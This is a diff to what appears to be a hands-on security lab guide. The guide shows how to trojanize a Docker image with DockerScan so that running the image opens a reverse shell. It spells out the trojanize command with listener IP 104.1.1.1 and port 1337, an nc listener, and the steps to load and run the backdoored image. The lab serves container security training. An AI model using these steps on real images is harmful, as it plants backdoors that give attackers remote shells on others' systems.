@@ -2,7 +2,9 @@
 
 ### *A docker image can be trojanized with a tool called `DockerScan`. When a trojanized container is launched, the attacker can get a `reverse-shell` on-to the container*
 
--------
+### **Lab Image : `Containers`**
+
+---
 
 #### Step 1:
 
@@ -24,7 +26,7 @@ export LC_CTYPE=en_US.UTF-8 && pip3 install dockerscan
 docker pull abhaybhargav/vul_flask && docker save abhaybhargav/vul_flask:latest -o abhaybhargav-vul_flask
 ```
 
--------
+---
 
 #### Step 2:
 
@@ -32,7 +34,8 @@ docker pull abhaybhargav/vul_flask && docker save abhaybhargav/vul_flask:latest 
 
 ```commandline
 export LC_ALL=C.UTF-8
-
+```
+```commandline
 export LANG=C.UTF-8
 ```
 
@@ -44,23 +47,23 @@ serverip
 
 * Trojanize the saved docker to create a `.tar` file
 
+> **EXAMPLE**: `dockerscan image modify trojanize abhaybhargav-vul_flask -l 104.1.1.1 -p 1337 -o abhaybhargav-vul_flask-trojanized`
+
 ```commandline
-dockerscan image modify trojanize abhaybhargav-vul_flask -l <IP> -p <PORT> -o abhaybhargav-vul_flask-trojanized
+dockerscan image modify trojanize abhaybhargav-vul_flask -l $(serverip) -p 1337 -o abhaybhargav-vul_flask-trojanized
 ```
 
-**EXAMPLE**: `dockerscan image modify trojanize abhaybhargav-vul_flask -l 104.1.1.1 -p 1337 -o abhaybhargav-vul_flask-trojanized`
-
--------
+---
 
 #### Step 3:
 
 * Once the command on **Step 2** has been run, a `netcat` command is returned. Run the command in another tab or use `tmux` to split the terminal.
 
-```commandline
-nc -v -k -l <IP> <PORT>
-```
+> **EXAMPLE**: `nc -v -k -l 104.1.1.1 1337`
 
-**EXAMPLE**: `nc -v -k -l 104.1.1.1 1337`
+```commandline
+nc -v -k -l $(serverip) 1337
+```
 
 * Load the trojanized `.tar` docker file
 
@@ -68,7 +71,7 @@ nc -v -k -l <IP> <PORT>
 docker load -i abhaybhargav-vul_flask-trojanized.tar
 ```
 
--------
+---
 
 #### Step 4:
 
@@ -84,7 +87,7 @@ docker images
 docker run -d -p 5000:5000 abhaybhargav/vul_flask
 ```
 
--------
+---
 
 #### Step 5:
 
@@ -96,7 +99,7 @@ docker run -d -p 5000:5000 abhaybhargav/vul_flask
 clean-docker
 ```
 
----------
+---
 
 ### Reading Material/References:
 
